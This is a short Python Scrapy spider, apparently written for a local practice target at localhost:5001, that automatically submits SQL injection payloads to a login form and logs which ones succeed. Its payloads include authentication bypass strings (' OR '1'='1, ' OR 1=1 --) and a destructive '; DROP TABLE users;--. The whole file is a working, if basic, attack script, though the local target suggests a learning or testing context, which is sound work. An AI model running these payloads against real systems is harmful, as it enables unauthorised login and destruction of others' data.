import scrapy

class SqliTestSpider(scrapy.Spider):
    name = "sqli_test"
    start_urls = [
        'http://localhost:5001/sqli',  # The URL of your local SQL injection page
    ]

    def parse(self, response):
        # Log that we reached the page
        self.logger.info(f"Reached start URL: {response.url}")

        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users;--"
        ]

        for payload in payloads:
            self.logger.info(f"Submitting payload: {payload}")
            yield scrapy.FormRequest(
                url='http://localhost:5001/sqli',
                formdata={'username': payload, 'password': payload},
                callback=self.after_submission,
                meta={'payload': payload}
            )

    def after_submission(self, response):
        payload = response.meta['payload']
        
        if "Welcome" in response.text:
            self.logger.info(f"✅ Successful SQL Injection with payload: {payload}")
        else:
            self.logger.info(f"❌ SQL Injection failed with payload: {payload}")

        # Also log HTTP response status
        self.logger.info(f"HTTP Response Code: {response.status}")
